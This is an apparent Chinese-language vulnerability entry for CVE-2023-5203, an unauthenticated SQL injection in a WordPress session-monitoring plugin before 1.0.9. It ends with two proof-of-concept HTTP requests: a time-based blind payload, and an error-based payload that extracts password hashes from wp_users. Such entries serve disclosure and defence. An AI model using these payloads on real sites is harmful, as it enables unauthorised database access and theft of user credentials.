# CVE-2023-5203

>WP Sessions Time Monitoring Full Automatic是一款WordPress插件，它能够准确测量每个页面和用户的所有活动时间，如工作时间、阅读时间、观看时间、特定用户的会话时间等。

## 来源

[https://wpscan.com/vulnerability/7f4f505b-2667-4e0f-9841-9c1cd0831932/](https://wpscan.com/vulnerability/7f4f505b-2667-4e0f-9841-9c1cd0831932/)

## 简介

WP Sessions Time Monitoring Full Automatic插件中存在SQL注入漏洞，由于其1.0.9版本之前在SQL查询中使用请求URL或查询参数之前未对其进行清理，未经身份验证的威胁者可通过SQL时间盲注从数据库中获取敏感信息。

## 影响范围

-   WP Sessions Time Monitoring Full Automatic < 1.0.9

## 漏洞类型

SQL注入

## POC
Blind time based SQLi
```http
GET /?test=1'%20AND%20(SELECT%208559%20FROM%20(SELECT(SLEEP(5)))WBVZ)%20-- HTTP/1.1
```
Error/union based SQLi (Requires MySQL and WP_DEBUG enabled)
```http
GET /?test=1%27%20AND%20GTID_SUBSET%28CONCAT%280x686173683a%2C%28SELECT%20MID%28%28IFNULL%28CAST%28user_pass%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%20FROM%20%60wordpress%60.wp_users%20ORDER%20BY%20ID%20LIMIT%201%2C1%29%29%2C3124%29--%20a
```

